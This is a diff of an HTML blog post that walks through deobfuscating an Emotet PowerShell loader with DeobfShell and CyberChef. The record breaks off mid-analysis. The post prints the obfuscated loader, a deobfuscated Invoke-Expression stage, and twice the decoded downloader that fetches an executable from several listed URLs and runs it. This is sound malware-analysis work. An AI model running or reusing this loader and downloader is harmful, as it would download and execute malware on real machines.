@@ -12,322 +12,98 @@
   <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
   
-  <!-- Expanded Favicon Support -->
+  <!-- Favicon -->
   <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
 
+  <!-- External CSS -->
+  <link rel="stylesheet" href="styles.css">
+
   <style>
+    /* Additional Styles Specific to Blog Posts */
+    .blog-post h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+      color: var(--heading-color);
+    }
 
-  /* Reuse the same styles from index.html */
-  :root {
-    --bg-color: #0e0e0e;
-    --text-color: #ccc;
-    --accent-color: #48a9a6; 
-    --card-bg: #191919;
-    --heading-color: #fff;
-    --link-color: #48a9a6;
-    --transition-speed: 0.3s;
-    --scale-hover: scale(1.03);
-  }
+    .blog-post h2, .blog-post h3, .blog-post h4, .blog-post h5, .blog-post h6 {
+      color: var(--heading-color);
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
 
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
+    .blog-post p {
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+    }
 
-  html, body {
-    width: 100%;
-    height: 100%;
-    overscroll-behavior: none;
-    scrollbar-width: none; /* For Firefox */
-  }
+    .blog-post a {
+      color: var(--accent-color);
+      text-decoration: none;
+    }
 
-  /* Hide scrollbar for Chrome, Safari and Opera */
-  body::-webkit-scrollbar {
-    display: none;
-  }
+    .blog-post a:hover {
+      text-decoration: underline;
+      background: var(--accent-color);
+      color: #000;
+    }
 
-  body {
-    background: var(--bg-color);
-    font-family: 'Orbitron', sans-serif;
-    color: var(--text-color);
-    line-height: 1.6;
-    overflow-y: auto; 
-    -webkit-overflow-scrolling: touch; 
-    position: relative;
-    touch-action: pan-y; /* Allow vertical panning on mobile */
-  }
+    .blog-post pre {
+      background-color: var(--card-bg);
+      color: var(--accent-color);
+      padding: 10px;
+      border-left: 3px solid var(--accent-color);
+      overflow-x: auto;
+      border-radius: 5px;
+      font-family: Consolas, "Courier New", monospace;
+    }
 
-  body::before {
-    content: "";
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    z-index: -3;
-    background: radial-gradient(circle at 30% 50%, rgba(72,169,166,0.05), transparent 40%), 
-                radial-gradient(circle at 70% 50%, rgba(72,169,166,0.05), transparent 40%);
-    animation: backgroundFloat 10s ease-in-out infinite alternate;
-  }
+    .blog-post .image-container {
+      text-align: center;
+      margin: 20px 0;
+    }
 
-  @keyframes backgroundFloat {
-    0% { transform: translateY(0); }
-    100% { transform: translateY(-20px); }
-  }
+    .blog-post .image-container img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 5px;
+    }
 
-  /* CRT Overlay */
-  .crt-overlay {
-    pointer-events: none;
-    position: fixed;
-    top:0; left:0; right:0; bottom:0;
-    z-index: 999;
-    opacity: 0.07;
-    mix-blend-mode: screen;
-    background: repeating-linear-gradient(
-      rgba(255,255,255,0.05) 0,
-      rgba(255,255,255,0.05) 1px,
-      transparent 2px,
-      transparent 4px
-    );
-    animation: crtScan 5s linear infinite;
-  }
+    .blog-post .image-container figcaption {
+      margin-top: 8px;
+      font-size: 0.9em;
+      color: #555555;
+    }
 
-  @keyframes crtScan {
-    0% { transform: translateY(-10%); }
-    50% { transform: translateY(10%); }
-    100% { transform: translateY(-10%); }
-  }
+    .blog-post .table-of-contents ul, .blog-post .table-of-contents li {
+      list-style-type: none;
+      padding-left: 0;
+    }
 
-  /* Scan lines overlay on body */
-  body::after {
-    content: "";
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    pointer-events: none;
-    background: repeating-linear-gradient(
-      to bottom,
-      rgba(255,255,255,0.02) 0,
-      rgba(255,255,255,0.02) 1px,
-      transparent 2px,
-      transparent 4px
-    );
-    mix-blend-mode: overlay;
-    opacity: 0.1;
-    z-index: -2;
-    animation: scanFlicker 8s infinite alternate ease-in-out;
-  }
+    .blog-post .table-of-contents li {
+      margin-bottom: 5px;
+    }
 
-  @keyframes scanFlicker {
-    0% { opacity: 0.1; }
-    50% { opacity: 0.15; }
-    100% { opacity: 0.1; }
-  }
+    /* Back to Home Button */
+    .back-to-home {
+      display: inline-block;
+      margin: 40px 0;
+      padding: 10px 20px;
+      background: var(--accent-color);
+      color: #000;
+      text-decoration: none;
+      border-radius: 5px;
+      transition: background var(--transition-speed), color var(--transition-speed);
+    }
 
-  /* Plexus Canvas */
-  #plexusCanvas {
-    position: fixed;
-    top:0; left:0; width:100%; height:100%;
-    z-index: -1;
-  }
-
-  /* Header */
-  header {
-    position: sticky;
-    top: 0;
-    background: rgba(14,14,14,0.95);
-    backdrop-filter: blur(3px);
-    z-index: 1000;
-    border-bottom: 1px solid #222;
-  }
-
-  header nav {
-    max-width: 1200px;
-    margin: 0 auto;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 20px;
-    gap: 20px;
-  }
-
-  header .logo {
-    font-weight: 700;
-    font-size: 1.3rem;
-    color: var(--heading-color);
-    letter-spacing: 1px;
-    white-space:nowrap;
-  }
-
-  nav ul {
-    list-style: none;
-    display: flex;
-    gap: 20px;
-  }
-
-  nav a {
-    color: var(--text-color);
-    text-decoration: none;
-    transition: color var(--transition-speed);
-    font-size:0.9rem;
-  }
-
-  nav a:hover {
-    color: var(--accent-color);
-  }
-
-  .audio-toggle {
-    margin-left: 20px;
-    white-space: nowrap;
-  }
-
-  .audio-toggle button {
-    background: none;
-    border: 1px solid var(--accent-color);
-    color: var(--text-color);
-    padding: 3px 8px;
-    border-radius: 3px;
-    cursor: pointer;
-    font-family: 'Orbitron', sans-serif;
-    font-size: 0.9rem;
-    transition: background var(--transition-speed), color var(--transition-speed);
-  }
-
-  .audio-toggle button:hover {
-    background: var(--accent-color);
-    color: #000;
-  }
-
-  /* Blog Post Section */
-  .blog-post {
-    margin-top: 40px;
-    padding: 0 20px;
-    color: var(--text-color);
-    text-align: left;
-  }
-
-  .blog-post h1 {
-    font-size: 2rem;
-    margin-bottom: 20px;
-    color: var(--heading-color);
-  }
-
-  .blog-post h2, .blog-post h3, .blog-post h4, .blog-post h5, .blog-post h6 {
-    color: var(--heading-color);
-    margin-top: 20px;
-    margin-bottom: 10px;
-  }
-
-  .blog-post p {
-    font-size: 0.95rem;
-    margin-bottom: 20px;
-  }
-
-  .blog-post a {
-    color: var(--accent-color);
-    text-decoration: none;
-  }
-
-  .blog-post a:hover {
-    text-decoration: underline;
-    background: var(--accent-color);
-    color: #000;
-  }
-
-  .blog-post pre {
-    background-color: var(--card-bg);
-    color: var(--accent-color);
-    padding: 10px;
-    border-left: 3px solid var(--accent-color);
-    overflow-x: auto;
-    border-radius: 5px;
-    font-family: Consolas, "Courier New", monospace;
-  }
-
-  .blog-post .image-container {
-    text-align: center;
-    margin: 20px 0;
-  }
-
-  .blog-post .image-container img {
-    max-width: 100%;
-    height: auto;
-    border-radius: 5px;
-  }
-
-  .blog-post .image-container figcaption {
-    margin-top: 8px;
-    font-size: 0.9em;
-    color: #555555;
-  }
-
-  .blog-post .table-of-contents ul, .blog-post .table-of-contents li {
-    list-style-type: none;
-    padding-left: 0;
-  }
-
-  .blog-post .table-of-contents li {
-    margin-bottom: 5px;
-  }
-
-  /* Footer */
-  footer {
-    background: #111;
-    color: var(--text-color);
-    text-align: center;
-    padding: 20px;
-    margin-top: 40px;
-    font-size: 0.8rem;
-    border-top: 1px solid #222;
-  }
-
-  footer p {
-    margin: 5px 0;
-  }
-
-  .footer-socials {
-    display: flex;
-    justify-content: center;
-    gap: 15px;
-    margin-top: 15px;
-  }
-
-  .footer-socials a {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    text-decoration: none;
-    transition: filter var(--transition-speed);
-  }
-
-  .footer-socials a img {
-    width: 20px;
-    height: 20px;
-    filter: brightness(0.8);
-  }
-
-  .footer-socials a:hover img {
-    filter: brightness(1);
-  }
-
-  /* Back to Home Button */
-  .back-to-home {
-    display: inline-block;
-    margin: 40px 0;
-    padding: 10px 20px;
-    background: var(--accent-color);
-    color: #000;
-    text-decoration: none;
-    border-radius: 5px;
-    transition: background var(--transition-speed), color var(--transition-speed);
-  }
-
-  .back-to-home:hover {
-    background: #fff;
-    color: var(--accent-color);
-  }
-
+    .back-to-home:hover {
+      background: #fff;
+      color: var(--accent-color);
+    }
   </style>
 </head>
 <body>
@@ -354,54 +130,44 @@
         <h1>Reverse Engineering Emotet's Obfuscated PowerShell Payload: A Deep Dive</h1>
         
         <p>
-          Malware authors are continually evolving their tactics to evade detection and complicate analysis. 
-          <strong>Emotet</strong>, a notorious banking Trojan turned modular botnet, is a prime example of this adaptability. 
-          One of its sophisticated techniques involves deeply obfuscated PowerShell scripts that encode and compress malicious payloads. 
-          In this blog post, we'll walk through the process of reverse engineering an obfuscated Emotet PowerShell script, 
-          leveraging tools like <a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a>, 
-          <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a>, and the 
-          <a href="https://dotnet.microsoft.com/" target="_blank" rel="noopener noreferrer">.NET Framework</a> to decode and comprehend its operations.
+          <strong>Emotet</strong> is a sophisticated banking Trojan that has evolved into a modular botnet. One of its advanced techniques involves the use of deeply obfuscated PowerShell scripts to deliver malicious payloads. This post walks through the reverse engineering process of such a script, utilizing tools like <a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a> and <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">CyberChef</a>.
         </p>
 
         <hr>
 
         <h2>Table of Contents</h2>
-        <div class="table-of-contents">
-          <ul>
-            <li><a href="#introduction">Introduction</a></li>
-            <li><a href="#understanding-the-obfuscated-powershell-script">Understanding the Obfuscated PowerShell Script</a></li>
-            <li>
-              <a href="#reverse-engineering-process">Reverse Engineering Process</a>
-              <ul>
-                <li><a href="#step-1-deobfuscating-the-powershell-script">Step 1: Deobfuscating the PowerShell Script</a></li>
-                <li><a href="#step-2-extracting-the-base64-string">Step 2: Extracting the Base64 String</a></li>
-                <li><a href="#step-3-decoding-the-base64-string">Step 3: Decoding the Base64 String</a></li>
-                <li><a href="#step-4-decompressing-the-payload">Step 4: Decompressing the Payload</a></li>
-                <li><a href="#step-5-analyzing-the-decompressed-script">Step 5: Analyzing the Decompressed Script</a></li>
-              </ul>
-            </li>
-            <li><a href="#technical-analysis-of-the-final-payload">Technical Analysis of the Final Payload</a></li>
-            <li><a href="#tools-and-resources">Tools and Resources</a></li>
-            <li><a href="#conclusion">Conclusion</a></li>
-            <li><a href="#disclaimer">Disclaimer</a></li>
-          </ul>
-        </div>
+        <ul>
+          <li><a href="#introduction">Introduction</a></li>
+          <li><a href="#understanding-the-obfuscated-script">Understanding the Obfuscated PowerShell Script</a></li>
+          <li>
+            <a href="#reverse-engineering-process">Reverse Engineering Process</a>
+            <ul>
+              <li><a href="#step-1-deobfuscating-the-script">Step 1: Deobfuscating the PowerShell Script</a></li>
+              <li><a href="#step-2-extracting-the-base64-string">Step 2: Extracting the Base64 String</a></li>
+              <li><a href="#step-3-decoding-the-base64-string">Step 3: Decoding the Base64 String</a></li>
+              <li><a href="#step-4-decompressing-the-payload">Step 4: Decompressing the Payload</a></li>
+              <li><a href="#step-5-analyzing-the-decompressed-script">Step 5: Analyzing the Decompressed Script</a></li>
+            </ul>
+          </li>
+          <li><a href="#technical-analysis">Technical Analysis of the Final Payload</a></li>
+          <li><a href="#tools-and-resources">Tools and Resources</a></li>
+          <li><a href="#conclusion">Conclusion</a></li>
+          <li><a href="#disclaimer">Disclaimer</a></li>
+        </ul>
 
         <hr>
 
         <h2 id="introduction">Introduction</h2>
         <p>
-          <strong>Emotet</strong> has been a persistent threat in the cybersecurity landscape, known for its ability to deliver additional malware payloads, including banking Trojans and ransomware. 
-          One of Emotet's primary methods of payload delivery is through obfuscated PowerShell scripts that encode and compress malicious commands. 
-          These scripts are designed to evade detection by traditional security measures, making manual analysis challenging.
+          <strong>Emotet</strong> has been a persistent threat in the cybersecurity landscape, known for its ability to deliver additional malware payloads, including banking Trojans and ransomware. Its primary method of payload delivery involves obfuscated PowerShell scripts that encode and compress malicious commands, designed to evade detection by traditional security measures.
         </p>
         <p>
-          In this post, we'll dissect a sample Emotet PowerShell script, demonstrating how to deobfuscate, decode, and decompress the payload to reveal its true intent.
+          In this post, we'll dissect a sample Emotet PowerShell script, demonstrating how to deobfuscate, decode, and decompress the payload to unveil its malicious intent.
         </p>
 
         <hr>
 
-        <h2 id="understanding-the-obfuscated-powershell-script">Understanding the Obfuscated PowerShell Script</h2>
+        <h2 id="understanding-the-obfuscated-script">Understanding the Obfuscated PowerShell Script</h2>
         <p>
           Here's the obfuscated PowerShell script we'll analyze:
         </p>
@@ -412,609 +178,623 @@
         </div>
 
         <pre><code>
-    ${pC695I} = [tYpE]( "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent' ); 
-    SeT   RxY= &( ([STRINg]$vERBOSEprEFERENce)[1,3]+'x'-JOIn'')((("{67}{22}{118}{0}{63}{98}{71}{46}{6}{36}{64}{113}{79}{49}{106}{1}{11}{99}{19}{57}{80}{88}{45}{60}{70}{30}{53}{102}{83}{89}{42}{17}{92}{32}{50}{68}{84}{55}{25}{39}{28}{76}{44}{12}{66}{43}{65}{13}{14}{87}{86}{61}{23}{40}{78}{111}{115}{94}{62}{34}{91}{104}{51}{16}{24}{58}{15}{56}{75}{93}{69}{105}{107}{73}{37}{82}{7}{108}{81}{38}{74}{90}{35}{85}{29}{2}{72}{18}{97}{5}{103}{26}{96}{77}{8}{114}{112}{31}{47}{110}{41}{48}{117}{10}{100}{116}{20}{54}{3}{101}{109}{33}{59}{4}{27}{9}{52}{21}{95}" -f 'sY','SsIOn','aQMT4A','odINg]::','h','0ra',' (ne','RM','nolUW','[21]+LHh','d','.D','BPd','JC','PGLFK','J8hl7gw','rp7','BJNZBRa8Iw','YOL','Fla','oMpreSS))','[34]','obj','twcfc2','m','x2JT','jq9CQufcObfgkG5UpR','Pshome','M2TVuL+','EzgDpr/','StrE',' , [io.CoMprESsIoN.compRe','8CUZzp','DtoEND( )DQ9','I0u','Y4pM+O4jUNXCQpqN8A','W-ob','GMd7iS','QSWEHeImHFH','Z','mz','n','SE64sTRInG(h','Zh1','uA19','m','(','ss','m','COMp','sD','F','PShOMe','AM] [CONvErt]::',' ,[TExT.enC','p4','sC4i','tES','qy','. ( LH','E','fv','cfy35Cis','STeM.IO.stReAMR','jecT','dmB','bxC','(neW-','i','2e','MorY','R','O1D5gjl3N','mWkR','3FR8d3s','lQb','N9Xy/p6z+HAd1E','20','hukwo','o.','tR','S','bxPtJ','rO','doeA2HbiissnoBnt','8e3fgI','R','As','eam( [io.','MBa','Deb','DdcpFI','FEb/Sh','Sd2HY1k0/LH','66mRy','+hBJXhBJ)','MYb9pod6Fx','9Y0F9R+hax','EADE','E','E]','ascii)','f','SO','R','irY2ZYmgabDa','Re','j353j6dPoMeF5','+w+',').REA','iO','mN8Tpkli3L','c=hBJ)',' i','W8cv1+g','qq3ZwH','::DeC','O','ecT ')).rEPlAce(([CHAR]68+[CHAR]81+[CHAR]57),[StRINg][CHAR]124).rEPlAce('hBJ',[StRINg][CHAR]39).rEPlAce('LHh','$'))&&   poWErShElL   ${pC695I} =[tYpE]( "{2}{1}{0}{3}" -f 'NM','O','eNvIR','ent' ); 
-    ${eXEcUTIoNcONTExt}."INvoKEcomMAnd".(  "{3}{2}{1}{0}"-f 't','IP','cR','invOKES'  ).Invoke( (    (   &(  "{1}{0}{2}" -f 'R','va','IAble' ) ( "{0}{1}" -f 'pc695','I' ) -vALUEonly )::( "{4}{2}{3}{1}{0}" -f 'IablE','aR','v','IrONMeNTv','gEtEn' ).Invoke(  'RXy',(  "{0}{1}" -f 'prOcES','s' )  ) )   )
+${pC695I} = [tYpE]( "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent' ); 
+SeT   RxY= &( ([STRINg]$vERBOSEprEFERENce)[1,3]+'x'-JOIn'')((("{67}{22}{118}{0}{63}{98}{71}{46}{6}{36}{64}{113}{79}{49}{106}{1}{11}{99}{19}{57}{80}{88}{45}{60}{70}{30}{53}{102}{83}{89}{42}{17}{92}{32}{50}{68}{84}{55}{25}{39}{28}{76}{44}{12}{66}{43}{65}{13}{14}{87}{86}{61}{23}{40}{78}{111}{115}{94}{62}{34}{91}{104}{51}{16}{24}{58}{15}{56}{75}{93}{69}{105}{107}{73}{37}{82}{7}{108}{81}{38}{74}{90}{35}{85}{29}{2}{72}{18}{97}{5}{103}{26}{96}{77}{8}{114}{112}{31}{47}{110}{41}{48}{117}{10}{100}{116}{20}{54}{3}{101}{109}{33}{59}{4}{27}{9}{52}{21}{95}" -f 'sY','SsIOn','aQMT4A','odINg]::','h','0ra',' (ne','RM','nolUW','[21]+LHh','d','.D','BPd','JC','PGLFK','J8hl7gw','rp7','BJNZBRa8Iw','YOL','Fla','oMpreSS))','[34]','obj','twcfc2','m','x2JT','jq9CQufcObfgkG5UpR','Pshome','M2TVuL+','EzgDpr/','StrE',' , [io.CoMprESsIoN.compRe','8CUZzp','DtoEND( )DQ9','I0u','Y4pM+O4jUNXCQpqN8A','W-ob','GMd7iS','QSWEHeImHFH','Z','mz','n','SE64sTRInG(h','Zh1','uA19','m','(','ss','m','COMp','sD','F','PShOMe','AM] [CONvErt]::',' ,[TExT.enC','p4','sC4i','tES','qy','. ( LH','E','fv','cfy35Cis','STeM.IO.stReAMR','jecT','dmB','bxC','(neW-','i','2e','MorY','R','O1D5gjl3N','mWkR','3FR8d3s','lQb','N9Xy/p6z+HAd1E','20','hukwo','o.','tR','S','bxPtJ','rO','doeA2HbiissnoBnt','8e3fgI','R','As','eam( [io.','MBa','Deb','DdcpFI','FEb/Sh','Sd2HY1k0/LH','66mRy','+hBJXhBJ)','MYb9pod6Fx','9Y0F9R+hax','EADE','E','E]','ascii)','f','SO','R','irY2ZYmgabDa','Re','j353j6dPoMeF5','+w+',').REA','iO','mN8Tpkli3L','c=hBJ)',' i','W8cv1+g','qq3ZwH','::DeC','O','ecT ')).rEPlAce(([CHAR]68+[CHAR]81+[CHAR]57),[StRINg][CHAR]124).rEPlAce('hBJ',[StRINg][CHAR]39).rEPlAce('LHh','$'))&&   poWErShElL   ${pC695I} =[tYpE]( "{2}{1}{0}{3}" -f 'NM','O','eNvIR','ent' ); 
+${eXEcUTIoNcONTExt}."INvoKEcomMAnd".(  "{3}{2}{1}{0}"-f 't','IP','cR','invOKES'  ).Invoke( (    (   &(  "{1}{0}{2}" -f 'R','va','IAble' ) ( "{0}{1}" -f 'pc695','I' ) -vALUEonly )::( "{4}{2}{3}{1}{0}" -f 'IablE','aR','v','IrONMeNTv','gEtEn' ).Invoke(  'RXy',(  "{0}{1}" -f 'prOcES','s' )  ) )   )
         </code></pre>
 
-      <div class="image-container">
-        <img src="https://i.imgur.com/DSLoYsm.png" alt="Deobfuscation by utilizing deobshell to parse the AST structure and reformat">
-        <figcaption>Figure 2: Deobfuscation process using DeobfShell to parse the AST structure and reformat the script.</figcaption>
+        <div class="image-container">
+          <img src="https://i.imgur.com/DSLoYsm.png" alt="Deobfuscation by utilizing deobshell to parse the AST structure and reformat">
+          <figcaption>Figure 2: Deobfuscation process using DeobfShell to parse the AST structure and reformat the script.</figcaption>
+        </div>
+
+        <p>
+          At first glance, this script is deliberately obfuscated to conceal its malicious intent. Through a series of steps, including deobfuscation, decoding, and decompression, we can unravel its functionality.
+        </p>
+
+        <hr>
+
+        <h2 id="reverse-engineering-process">Reverse Engineering Process</h2>
+        <p>
+          To effectively analyze this script, we'll follow a structured approach:
+        </p>
+        <ol>
+          <li>Deobfuscate the PowerShell Script</li>
+          <li>Extract the Base64 String</li>
+          <li>Decode the Base64 String</li>
+          <li>Decompress the Payload</li>
+          <li>Analyze the Decompressed Script</li>
+        </ol>
+
+        <h3 id="step-1-deobfuscating-the-script">Step 1: Deobfuscating the PowerShell Script</h3>
+        <p><strong>Objective:</strong> Simplify the obfuscated script to make its operations transparent.</p>
+        <p><strong>Approach:</strong></p>
+        <ul>
+          <li><strong>Identify Patterns and Common Techniques:</strong> Emotet often employs variable renaming, string manipulation, and dynamic method invocation.</li>
+          <li><strong>Use Deobfuscation Tools:</strong> Utilize repositories like <a href="https://github.com/deobfshell/deobfshell" target="_blank" rel="noopener noreferrer">DeobfShell</a> to parse and simplify the script.</li>
+        </ul>
+        <p><strong>Implementation:</strong></p>
+
+        <h4>1. Variable Renaming</h4>
+        <p>Replace nonsensical variable names with meaningful ones.</p>
+        <pre><code>
+# Original
+${pC695I} = [tYpE]( "{2}{1}{0}{3}"-f'NM','O','eNvIR','ent' );
+
+# Simplified
+$EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # Resolves to 'Environment'
+        </code></pre>
+
+        <h4>2. String Formatting</h4>
+        <p>Decode the string formatting to reveal actual method names.</p>
+        <pre><code>
+# Original
+"{2}{1}{0}{3}"-f'NM','O','eNvIR','ent'
+
+# Simplified
+"eNvIR" + "O" + "NM" + "ent"  # Results in "Environment"
+        </code></pre>
+
+        <h4>3. Dynamic Method Invocation</h4>
+        <p>Understand how methods are being dynamically constructed and invoked.</p>
+        <pre><code>
+# Original
+([STRINg]$vERBOSEprEFERENce)[1,3]+'x'-JOIn''
+
+# Simplified
+($VerbosePreference)[1,3] + 'x' -Join''  # Extracts characters at indices 1 and 3 and concatenates with 'x'
+# Assuming $VerbosePreference = "SilentlyContinue", indices 1 and 3 correspond to 'i' and 'e', resulting in 'iex'
+        </code></pre>
+
+        <h4>4. Parsing the AST with DeobfShell</h4>
+        <p>
+          <strong>DeobfShell</strong> leverages the .NET Framework's Abstract Syntax Tree (AST) to parse and deobfuscate PowerShell scripts. The AST provides a tree representation of the script's syntax, allowing tools like DeobfShell to analyze and transform obfuscated code systematically.
+        </p>
+        <p>
+          By parsing the AST, DeobfShell can identify patterns such as variable assignments, method invocations, and string manipulations. It then refactors the script by renaming variables to meaningful names, simplifying expressions, and reconstructing dynamically built method names.
+        </p>
+        <p>
+          In our example, DeobfShell parses the AST to:
+        </p>
+        <ul>
+          <li>Identify and rename variables like <code>${pC695I}</code> to <code>$EnvironmentType</code>.</li>
+          <li>Simplify string concatenations and formatting to reveal method names like <code>Invoke-Expression</code> (<code>iex</code>).</li>
+          <li>Extract and reconstruct encoded or compressed payloads embedded within the script.</li>
+        </ul>
+
+        <h4>5. Final Deobfuscated Script</h4>
+        <pre><code>
+$EnvironmentType = [Type]("eNvIR" + "O" + "NM" + "ent");  # 'Environment'
+$InvokeExpression = 'iex';  # Result from dynamic string construction
+$Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
+$DecompressedData = [Text.Encoding]::ASCII.GetString([Compression.DeflateStream]::Decompress([MemoryStream]::new([Convert]::FromBase64String($Base64String))));
+Invoke-Expression($DecompressedData);
+        </code></pre>
+
+        <p><strong>Explanation:</strong></p>
+        <ul>
+          <li>The script constructs the string <code>'Environment'</code> to interact with environment variables.</li>
+          <li>It dynamically builds the <code>Invoke-Expression</code> (<code>iex</code>) command to execute the decompressed payload.</li>
+        </ul>
+
+        <h3 id="step-2-extracting-the-base64-string">Step 2: Extracting the Base64 String</h3>
+        <p><strong>Objective:</strong> Isolate the Base64-encoded string embedded within the script for decoding.</p>
+        <p><strong>Approach:</strong></p>
+        <ul>
+          <li><strong>Identify the Encoding Method:</strong> Emotet commonly uses Base64 encoding to embed payloads.</li>
+          <li><strong>Extract the String:</strong> Use pattern matching or manual extraction.</li>
+        </ul>
+        <p><strong>Implementation:</strong></p>
+        <p>From the deobfuscated script:</p>
+        <pre><code>
+$Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
+        </code></pre>
+        <p><strong>Outcome:</strong></p>
+        <p>The Base64 string is now isolated and ready for decoding.</p>
+
+        <h3 id="step-3-decoding-the-base64-string">Step 3: Decoding the Base64 String</h3>
+        <p><strong>Objective:</strong> Convert the Base64 string into a byte array for further processing.</p>
+        <p><strong>Approach:</strong></p>
+        <ul>
+          <li><strong>Use Decoding Tools:</strong> PowerShell, Python, or CyberChef can decode Base64 strings.</li>
+          <li><strong>Ensure Integrity:</strong> Verify that the decoded data matches expectations (e.g., correct byte length).</li>
+        </ul>
+        <p><strong>Implementation:</strong></p>
+        <p>Using PowerShell:</p>
+        <pre><code>
+$Base64String = "NZBRa8IwFEb/Sh8CUZzpsDidoeA2HbiissnoBntp4x2JTZM2TVuL+N9Xy/p6z+HAd1EuA19BPdbxCZh1dmBJCPGLFKAsRfvtwcfc2mzhukwomN8Tpkli3Lqq3ZwH66mRycfy35CisI0uDdcpFIRFrp7mqyJ8hl7gwsC4ilQbSd2HY1k0/LH2eirY2ZYmgabDaj353j6dPoMeF5mWkRGMd7iSbxPtJRM+w+SQSWEHeImHFH3FR8d3sDebY4pM+O4jUNXCQpqN8A8e3fgIEzgDpr/aQMT4AO1D5gjl3NYOL9Y0F9R+hax0raSOjq9CQufcObfgkG5UpRMYb9pod6Fx20nolUWW8cv1+gc=";
+$bytes = [Convert]::FromBase64String($Base64String);
+Write-Output "Decoded Byte Array Length: $($bytes.Length) bytes";
+        </code></pre>
+        <p><strong>Output:</strong></p>
+        <pre><code>
+Decoded Byte Array Length: 180 bytes
+        </code></pre>
+        <p><strong>Explanation:</strong></p>
+        <p>The Base64 string successfully decodes into a 180-byte array, ready for decompression.</p>
+
+        <h3 id="step-4-decompressing-the-payload">Step 4: Decompressing the Payload</h3>
+        <p><strong>Objective:</strong> Uncompress the decoded byte array to reveal the underlying PowerShell script.</p>
+        <p><strong>Approach:</strong></p>
+        <ul>
+          <li><strong>Identify Compression Method:</strong> Emotet typically uses the Deflate algorithm.</li>
+          <li><strong>Use Appropriate Tools:</strong> CyberChef allows specifying raw Inflate (Deflate without headers), which is essential when headers are absent.</li>
+        </ul>
+        <p><strong>Implementation:</strong></p>
+        <p>Using <strong>CyberChef</strong>:</p>
+        <ol>
+          <li><strong>Input:</strong> Paste the decoded byte array.</li>
+          <li><strong>Operation:</strong> Apply <code>Deflate Inflate (Raw)</code>.</li>
+          <li><strong>Output:</strong> Obtain the readable PowerShell script.</li>
+        </ol>
+        <p><strong>Result:</strong></p>
+
+        <div class="image-container">
+          <img src="https://i.imgur.com/2s996rx.png" alt="Decoded and decompressed script parameters">
+          <figcaption>Figure 3: Decoded and decompressed script parameters after applying raw Inflate.</figcaption>
+        </div>
+
+        <pre><code>
+$qlK = New-Object Net.WebClient;
+$OMS = 'http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');
+$Xbd = '378';
+$rWQ = "$env:temp\$Xbd.exe";
+foreach ($OWc in $OMS) {
+    try {
+        $qlK.DownloadFile($OWc, $rWQ);
+        Invoke-Item $rWQ;
+        break;
+    } catch {}
+}
+        </code></pre>
+        <p><strong>Explanation:</strong></p>
+        <p>The decompressed script is now readable and outlines its malicious intent.</p>
+
+        <hr>
+
+        <h3 id="step-5-analyzing-the-decompressed-script">Step 5: Analyzing the Decompressed Script</h3>
+        <p><strong>Objective:</strong> Understand the functionality and malicious operations of the decompressed script.</p>
+        <p><strong>Decompressed Script:</strong></p>
+        <pre><code>
+$qlK = New-Object Net.WebClient;
+$OMS = 'http://cine80.co.kr/wvw/qhKE5rlkR@http://listyourhomes.ca/o5qDsWBe@http://hire-van.com/6dusyh9w3@http://icxturkey.com/nE2YMAjUK@http://spolarich.com/vlJ2o3k2h7'.Split('@');
+$Xbd = '378';
+$rWQ = "$env:temp\$Xbd.exe";
+foreach ($OWc in $OMS) {
+    try {
+        $qlK.DownloadFile($OWc, $rWQ);
+        Invoke-Item $rWQ;
+        break;
+    } catch {}
+}
+        </code></pre>
+
+        <p><strong>Detailed Breakdown:</strong></p>
+        <ol>
+          <li><strong>WebClient Object Creation:</strong>
+            <pre><code>$qlK = New-Object Net.WebClient;</code></pre>
